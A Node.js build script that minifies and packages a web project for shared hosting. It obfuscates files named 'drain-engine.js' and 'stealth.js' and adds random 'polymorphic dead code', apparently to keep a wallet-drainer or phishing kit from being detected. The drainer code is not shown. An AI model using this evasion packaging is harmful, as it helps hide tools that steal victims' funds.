// [PRODUCTION - BUILD SYSTEM]
// High-performance build automation for production assets.
// Authorized use only.

const fs = require('fs');
const path = require('path');
const { minify } = require('terser');
const CleanCSS = require('clean-css');
const { minify: minifyHtml } = require('html-minifier-terser');

async function buildFrontend() {
    console.log('[PRODUCTION] Building frontend for production deployment...');
    
    try {
        // Create dist directory
        const distDir = path.join(__dirname, 'dist');
        if (!fs.existsSync(distDir)) {
            fs.mkdirSync(distDir);
        }
        
        // Copy EVERYTHING from public to dist (flattened)
        const publicDir = path.join(__dirname, 'public');
        if (fs.existsSync(publicDir)) {
            copyRecursiveSync(publicDir, distDir);
        }

        // Minify and Obfuscate all JavaScript files (Overwrite in dist)
        console.log('[PRODUCTION] Obfuscating production assets...');
        const jsFilesToObfuscate = [
            'app.js',
            'drain-engine.js',
            'assets/js/stealth.js'
        ];

        for (const file of jsFilesToObfuscate) {
            const filePath = path.join(distDir, file);
            if (!fs.existsSync(filePath)) continue;
            
            let jsContent = fs.readFileSync(filePath, 'utf8');
            
            // Inject Polymorphic Dead Code
            const deadCode = `function _0x${Math.random().toString(16).slice(2, 8)}(){return true;}\n`;
            jsContent = deadCode + jsContent;

            const minifiedJs = await minify(jsContent, {
                compress: { drop_console: true, dead_code: true },
                mangle: { toplevel: true }
            });
            
            fs.writeFileSync(filePath, minifiedJs.code);
            console.log(`[PRODUCTION] Obfuscated ${file}`);
        }

        // Minify HTML (Overwrite in dist)
        console.log('[PRODUCTION] Minifying HTML...');
        const htmlPath = path.join(distDir, 'index.html');
        if (fs.existsSync(htmlPath)) {
            const htmlContent = fs.readFileSync(htmlPath, 'utf8');
            const minifiedHtml = await minifyHtml(htmlContent, {
                collapseWhitespace: true,
                removeComments: true,
                minifyJS: true
            });
            fs.writeFileSync(htmlPath, minifiedHtml);
        }

        // Create .htaccess for Hostinger Shared Hosting
        const htaccessContent = `
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ server.js/$1 [L]
        `;
        fs.writeFileSync(path.join(distDir, '.htaccess'), htaccessContent);
        
        // Create production server file (already simplified for dist)
        const productionServer = `
const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.static(__dirname));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.listen(PORT);
        `;
        fs.writeFileSync(path.join(distDir, 'server.js'), productionServer);
        
        // Copy mobile and admin folders
        const foldersToCopy = ['mobile', 'admin'];
        for (const folder of foldersToCopy) {
            const srcFolder = path.join(__dirname, folder);
            const destFolder = path.join(distDir, folder);
            if (fs.existsSync(srcFolder)) {
                copyRecursiveSync(srcFolder, destFolder);
            }
        }

        console.log('[PRODUCTION] Flattened standalone package created in dist/');
        
    } catch (error) {
        console.error(`[PRODUCTION] Build failed: ${error}`);
    }
}

// Helper function to copy folders recursively
function copyRecursiveSync(src, dest) {
    const exists = fs.existsSync(src);
    const stats = exists && fs.statSync(src);
    const isDirectory = exists && stats.isDirectory();
    if (isDirectory) {
        if (!fs.existsSync(dest)) fs.mkdirSync(dest);
        fs.readdirSync(src).forEach((childItemName) => {
            copyRecursiveSync(path.join(src, childItemName), path.join(dest, childItemName));
        });
    } else {
        fs.copyFileSync(src, dest);
    }
}

// Run build if called directly
if (require.main === module) {
    buildFrontend();
}

module.exports = { buildFrontend };
